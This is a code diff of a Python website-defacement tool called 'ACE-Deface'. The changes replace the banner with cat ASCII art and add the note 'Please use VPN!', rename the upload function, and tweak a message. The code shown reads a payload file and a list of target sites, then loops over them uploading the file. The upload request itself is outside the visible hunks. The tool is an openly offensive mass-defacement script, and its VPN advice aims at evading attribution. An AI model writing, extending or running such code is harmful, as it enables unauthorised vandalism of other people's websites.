@@ -8,14 +8,16 @@ except ImportError:
    exit("install requests and try again ...")
 
 banner = """
- 
- /||||||||\\
-| A        || Author : Disease (CPScript)
-|          || Date   : 8-18-2023
-|    ♤    || Tools  : ACE-Deface V.1.0
-|          || Github : CPScript
-|        A ||
- \________//
+             ＿＿
+　　　　 　 / ＞　　フ   
+ 　　　　　| 　_　 _ l   Author : Disease (CPScript)
+　 　　 　／` ミ＿xノ    Date   : 8-18-2023
+　　 　 /　　　 　 |     Tools  : ACE-Deface V.1.0
+　　　 /　 ヽ　　 ﾉ      Note   : Please use VPN!
+　 　 │　　|　|　|
+　／￣|　　 |　|　|
+　| (￣ヽ＿ヽ)__)
+　 ＼二つ
 """
 
 b = '\033[31m'
@@ -31,12 +33,12 @@ def x(tetew):
    
    return str(ipt)
 
-def aox(script,target_file="target.txt"):
+def ace(script,target_file="target.txt"):
    op = open(script,"r").read()
    with open(target_file, "r") as target:
       target = target.readlines()
       s = requests.Session()
-      print("uploading file to %d website"%(len(target)))
+      print("uploading to %d website"%(len(target)))
       for web in target:
          try:
             site = web.strip()
@@ -66,7 +68,7 @@ def main(__bn__):
       except KeyboardInterrupt:
          print; exit()
 
-   aox(a)
+   ace(a)
 
 if __name__ == "__main__":
     main(banner)
